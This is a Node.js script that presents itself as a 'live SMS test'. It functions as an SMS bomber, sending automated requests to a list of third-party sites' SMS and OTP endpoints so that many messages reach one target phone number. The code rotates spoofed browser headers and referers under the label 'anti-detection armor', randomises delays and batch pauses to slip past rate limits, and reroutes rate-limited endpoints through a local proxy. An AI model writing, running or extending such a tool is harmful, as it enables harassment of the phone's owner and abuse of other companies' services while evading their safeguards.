// Live SMS test with full anti-detection armor
import { readFileSync, writeFileSync } from 'fs';
import { spawn } from 'child_process';

const USER_PHONE = '5343622375';
const USER_EMAIL = 'test@test.com';

function uniqueEmail(epId) {
  return `test+${epId}@testtest.com`;
}

// ============ ANTI-DETECTION ARMOR ============

const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0',
];

const ACCEPTS = [
  'application/json, text/plain, */*',
  'application/json, text/html, */*',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
  'application/json, text/javascript, */*; q=0.01',
  '*/*',
];

const ACCEPT_LANGS = [
  'tr-TR,tr;q=0.9,en;q=0.8',
  'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
  'tr,en;q=0.9',
  'en-US,en;q=0.9,tr;q=0.8',
  'tr-TR,tr;q=0.9',
];

const SEC_CH_UA_PLATFORMS = ['"Windows"', '"macOS"', '"Linux"', '"iOS"', '"Android"'];

const ORIGINS = [
  '', // no origin
  'https://www.google.com',
  'https://www.facebook.com',
  'https://www.instagram.com',
];

const REFERERS = [
  '', // no referer
  'https://www.google.com/',
  'https://www.facebook.com/',
  'https://www.instagram.com/',
  'https://twitter.com/',
  'https://www.youtube.com/',
];

function pick(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

function buildHeaders(endpointUrl) {
  const origin = endpointUrl ? new URL(endpointUrl).origin : '';
  return {
    'User-Agent': pick(USER_AGENTS),
    Accept: pick(ACCEPTS),
    'Accept-Language': pick(ACCEPT_LANGS),
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': Math.random() > 0.3 ? 'application/json' : 'application/x-www-form-urlencoded',
    'Cache-Control': Math.random() > 0.5 ? 'no-cache' : 'max-age=0',
    Pragma: Math.random() > 0.7 ? 'no-cache' : '',
    Origin: Math.random() > 0.4 ? origin : pick(ORIGINS),
    Referer: Math.random() > 0.4 ? origin + '/' : pick(REFERERS),
    'Sec-Fetch-Site': pick(['same-origin', 'cross-site', 'same-site', 'none']),
    'Sec-Fetch-Mode': pick(['cors', 'navigate', 'no-cors']),
    'Sec-Fetch-Dest': pick(['empty', 'document', 'font']),
    Connection: 'keep-alive',
  };
}

function randomDelay() {
  return new Promise(r => setTimeout(r, 800 + Math.random() * 2500));
}

function bigDelay() {
  return new Promise(r => setTimeout(r, 3000 + Math.random() * 5000));
}

// ============ PARSE ENDPOINTS ============

const content = readFileSync('constants.ts', 'utf-8');

const idRegex = /id:\s*'([^']+)'/g;
const nameRegex = /name:\s*'([^']+)'/g;
const urlRegex = /url:\s*'([^']+)'/g;
const methodRegex = /method:\s*'([^']+)'/g;
const statusRegex = /status:\s*'([^']+)'/g;
const payloadRegex = /payloadInfo:\s*'([^']+)'/g;
const headersRegex = /headers:\s*(\{[^}]+\})/g;

const idVals = [...content.matchAll(idRegex)].map(m => m[1]);
const nameVals = [...content.matchAll(nameRegex)].map(m => m[1]);
const urlVals = [...content.matchAll(urlRegex)].map(m => m[1]);
const methodVals = [...content.matchAll(methodRegex)].map(m => m[1]);
const statusVals = [...content.matchAll(statusRegex)].map(m => m[1]);
const payloadVals = [...content.matchAll(payloadRegex)].map(m => m[1]);
const headerMatches = [...content.matchAll(headersRegex)];

function getHeadersForId(id) {
  const idIdx = content.indexOf(`id: '${id}'`);
  const afterId = content.substring(idIdx);
  const hMatch = afterId.match(/headers:\s*(\{[^}]+\})/);
  if (!hMatch) return {};
  try {
    return JSON.parse(hMatch[1].replace(/(\w+):/g, '"$1":').replace(/'/g, '"'));
  } catch {
    return {};
  }
}

const endpoints = idVals.map((id, i) => ({
  id,
  name: nameVals[i] || '',
  url: urlVals[i] || '',
  method: methodVals[i] || 'POST',
  status: statusVals[i] || 'unknown',
  payload: payloadVals[i] || '',
  headers: getHeadersForId(id),
}));

// Deduplicate endpoints (keep last)
const seen = new Map();
for (const ep of endpoints) {
  seen.set(ep.id, ep);
}
const uniqueEndpoints = [...seen.values()];

const working = uniqueEndpoints.filter(e => e.status === 'working' || e.status === 'limited');

console.log(`Found ${working.length} working/limited endpoints\n`);

// ============ INTERPOLATE PAYLOAD ============

function interpolate(payloadStr, epId, phone = USER_PHONE) {
  const email = uniqueEmail(epId);
  if (!payloadStr) return { phone: `5${phone}` };
  let str = payloadStr;
  str = str.replace(/\{\{PHONE\}\}/g, phone);
  str = str.replace(/\{\{EMAIL\}\}/g, email);
  str = str.replace(/\+905XXXXXXXXX/g, `+90${phone}`);
  str = str.replace(/905XXXXXXXXX/g, `90${phone}`);
  str = str.replace(/05XXXXXXXXX/g, `0${phone}`);
  str = str.replace(/5XXXXXXXXX/g, phone);
  str = str.replace(/\+90\{\{PHONE\}\}/g, `+90${phone}`);
  // Fix Evidea missing confirm
  const parsed = JSON.parse(str);
  if (epId === 'evidea' && parsed.confirm === undefined) parsed.confirm = true;
  return parsed;
}

// ============ DIRECT HTTP CALL WITH FULL SPOOF ============

async function callEndpoint(ep, viaProxy = false) {
  const url = viaProxy ? 'http://localhost:3001/api/proxy' : ep.url;
  const payload = interpolate(ep.payload, ep.id);
  const headers = viaProxy ? { 'Content-Type': 'application/json' } : buildHeaders(ep.url);

  // Merge custom headers if any
  if (!viaProxy && ep.headers && Object.keys(ep.headers).length > 0) {
    Object.assign(headers, ep.headers);
  }

  const method = ep.id === 'sportive' ? 'GET' : 'POST';

  const body = viaProxy
    ? JSON.stringify({
        serviceId: ep.id,
        serviceUrl: ep.url,
        serviceMethod: method,
        serviceHeaders: ep.headers,
        targetPhone: USER_PHONE,
        email: uniqueEmail(ep.id),
        initialPayload: payload,
        allowAiHealing: true,
      })
    : method === 'POST'
      ? JSON.stringify(payload)
      : undefined;

  const c = new AbortController();
  const t = setTimeout(() => c.abort(), 15000);

  try {
    const start = Date.now();
    const res = await fetch(url, {
      method,
      headers,
      body,
      signal: c.signal,
    });
    clearTimeout(t);
    const ms = Date.now() - start;
    let data;
    try {
      data = await res.json();
    } catch {
      data = await res.text().catch(() => '');
    }
    return { ok: res.ok || res.status === 202, status: res.status, ms, data, viaProxy };
  } catch (err) {
    clearTimeout(t);
    return { ok: false, status: 0, ms: 0, data: err.cause?.code || err.code || err.message, viaProxy };
  }
}

// ============ START PROXY ============

let proxyProcess = null;

async function ensureProxy() {
  try {
    const test = await fetch('http://localhost:3001/api/proxy', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        serviceId: 'test',
        serviceUrl: 'https://httpbin.org/post',
        targetPhone: '5321111111',
        initialPayload: { phone: '5321111111' },
      }),
      signal: AbortSignal.timeout(3000),
    });
    console.log('Proxy already running on :3001\n');
    return;
  } catch {
    console.log('Starting proxy on :3001...');
  }

  return new Promise(resolve => {
    proxyProcess = spawn('npx', ['tsx', 'local-dev.ts'], {
      stdio: 'ignore',
      env: { ...process.env, PORT: '3001' },
    });
    setTimeout(resolve, 3000);
  });
}

// ============ SHUFFLE & RUN ============

function shuffle(arr) {
  const a = [...arr];
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
}

async function main() {
  await ensureProxy();

  // Only retry the failed ones
  const prevResults = [];
  try {
    const saved = readFileSync('live-sms-results.json', 'utf-8');
    prevResults.push(...JSON.parse(saved));
  } catch {}
  const failedIds = new Set(prevResults.filter(r => !r.ok).map(r => r.id));

  // Shuffle endpoints so order is random
  const queue = shuffle(working);
  const results = [];

  console.log('🚀 Starting SMS blitz with full anti-detection...');
  console.log(`📱 Target phone: 0${USER_PHONE}`);
  console.log(`🔀 Shuffled order: ${queue.map(e => e.name).join(', ')}\n`);

  let successCount = 0;
  let failCount = 0;

  for (let i = 0; i < queue.length; i++) {
    const ep = queue[i];

    // Random delay before each request
    if (i > 0) {
      if (i % 5 === 0) {
        console.log('\n--- batch pause ---');
        await bigDelay(); // longer pause every 5
      } else {
        await randomDelay();
      }
    }

    // Try direct first
    let result = await callEndpoint(ep, false);

    // If direct failed AND it's limited, try via proxy
    if (!result.ok && ep.status === 'limited') {
      await randomDelay();
      const r2 = await callEndpoint(ep, true);
      if (r2.ok) result = r2;
    }

    const icon = result.ok ? '✅' : '❌';
    if (result.ok) successCount++;
    else failCount++;

    let detail = '';
    if (result.viaProxy) detail = ` [proxy: ${result.data?.strategy || ''}]`;
    else if (result.data?.strategy) detail = ` [strategy: ${result.data.strategy}]`;

    console.log(`${icon} [${i + 1}/${queue.length}] ${(ep.name + detail).padEnd(45)} HTTP ${result.status} (${result.ms}ms)`);

    results.push({
      id: ep.id,
      name: ep.name,
      url: ep.url,
      ok: result.ok,
      status: result.status,
      ms: result.ms,
      viaProxy: result.viaProxy,
      response: typeof result.data === 'object' ? JSON.stringify(result.data).substring(0, 200) : String(result.data).substring(0, 200),
    });

    writeFileSync('live-sms-results.json', JSON.stringify(results, null, 2));
  }

  // Summary
  console.log('\n' + '='.repeat(60));
  console.log(`📊 SONUÇ: ${successCount} başarılı, ${failCount} başarısız (${queue.length} endpoint)`);
  console.log('='.repeat(60));

  if (successCount > 0) {
    console.log('\n✅ SMS gönderilenler:');
    results.filter(r => r.ok).forEach(r => console.log(`  ✅ ${r.name} (${r.ms}ms)`));
  }
  if (failCount > 0) {
    console.log('\n❌ Başarısız:');
    results.filter(r => !r.ok).forEach(r => console.log(`  ❌ ${r.name} - HTTP ${r.status}`));
  }

  if (proxyProcess) proxyProcess.kill();
  console.log('\nResults saved to live-sms-results.json');
}

main().catch(err => {
  console.error('FATAL:', err);
  if (proxyProcess) proxyProcess.kill();
});
